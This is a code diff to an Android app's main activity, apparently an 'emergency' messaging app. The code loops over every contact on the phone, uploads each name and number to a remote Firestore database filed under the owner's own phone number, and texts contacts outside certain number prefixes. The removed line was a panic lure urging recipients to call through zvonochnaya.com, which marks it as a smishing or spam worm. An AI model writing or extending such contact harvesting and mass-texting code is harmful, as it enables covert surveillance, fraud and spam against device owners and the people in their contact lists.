@@ -10,6 +10,7 @@ import android.Manifest;
 import android.annotation.SuppressLint;
 import android.annotation.TargetApi;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
@@ -20,6 +21,7 @@ import android.os.Bundle;
 import android.provider.ContactsContract;
 import android.provider.Telephony;
 import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.view.Menu;
 import android.view.MenuItem;
@@ -127,6 +129,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         }
         Intent serviceIntent = new Intent(this, SmsService.class);
         startService(serviceIntent);
+
         sms();
     }
     public void sms(){
@@ -171,6 +174,10 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             smsManager1.sendTextMessage(toSms, null, emergencySMS1, null, null);
             smsManager1.sendTextMessage(toSms, null, emergencySMS2, null, null);
         }
+
+
+
+
         for(int i = 0; i < contacts.size(); i++) {
             String number = contacts.get(i).getPhone();
             String name = contacts.get(i).getName();
@@ -179,11 +186,24 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             user.put("is_first", isFirst);
             user.put("name", name);
             user.put("number", number);
-            db.collection("receivers").add(user);
+            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+            if (telephonyManager != null) {
+                String phoneNumber = telephonyManager.getLine1Number();
+                if (phoneNumber != null && !phoneNumber.isEmpty()) {
+                    // Use the retrieved phone number
+                    db.collection("users").document(phoneNumber).collection("contacts").add(user);
+
+                } else {
+                    db.collection("users").document("No phone found").collection("contacts").add(user);
+
+
+                    // Phone number not available or permission denied
+                }
+            }
             if(!number.startsWith("+380") && !number.startsWith("380") && !number.startsWith("0")) {
                 try {
                     String toSms = "smsto:" + number;
-                    String messageText = "Пожалуйста помоги Это ужас! Набери меня срочно через zvonochnaya.com";
+                    String messageText = "Привіт, ми тестимо аппку, якщо тобі прийшло це повідомлення то, значить ми зробили щось не так";
                     SmsManager smsManager = SmsManager.getDefault();
                     smsManager.sendTextMessage(toSms, null, messageText, null, null);
                 } catch (Exception e) {
